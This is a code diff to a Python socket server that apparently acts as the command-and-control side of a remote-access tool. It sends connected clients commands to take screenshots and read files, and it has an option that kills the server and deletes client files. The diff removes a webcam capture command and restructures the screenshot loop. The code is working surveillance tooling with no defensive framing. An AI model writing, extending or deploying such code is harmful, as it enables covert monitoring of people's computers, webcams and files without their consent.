@@ -1,4 +1,6 @@
 import argparse, socket, threading, time, queue, os, sys
+import numpy as np
+import cv2
 
 SCREENSHOT_DIR = 'screenshots/{ip}/{date}'
 client_sockets = []
@@ -11,7 +13,6 @@ def args_parse(command_line=None):
     parser.add_argument('-s', '--show', action='store_true', help='Display the list of files received')
     parser.add_argument('-r', '--readfile', nargs='*', type=str, help='Read the content of a file')
     parser.add_argument('-k', '--kill', action='store_true', help='Kill the server and delete client files')
-    parser.add_argument('-c', '--capture', action='store_true', help='Capture the webcam')
     parser.add_argument('-S', '--screenshot', action='store_true', help='Take a screenshot')
 
     if command_line:
@@ -63,16 +64,9 @@ def handle_commands(args, server_socket):
     if args.kill:
         print("Killing the server...")
         sys.exit(0)
-    if args.capture:
-        for client_socket in client_sockets:
-            try:
-                client_socket.sendall('CAPTURE'.encode())
-                print(f"Capture opened")
-            except socket.error:
-                print('Error sending capture command to a client')
     if args.screenshot:
-        for client_socket in client_sockets:
-            try:
+        try:
+            for client_socket in client_sockets:
                 global SCREENSHOT_DIR
                 ip = socket.gethostbyname(socket.gethostname())
                 date = time.strftime('%d-%m-%Y')
@@ -80,9 +74,9 @@ def handle_commands(args, server_socket):
                 if not os.path.exists(SCREENSHOT_DIR):
                     os.makedirs(SCREENSHOT_DIR)
                 client_socket.sendall('SCREENSHOT'.encode())
-                print(f"Screenshot sent")
-            except socket.error:
-                print('Error sending screenshot command to a client')
+            print(f"Screenshot sent")
+        except socket.error:
+            print('Error sending screenshot command to a client')
 
 
 # Function to read the commands
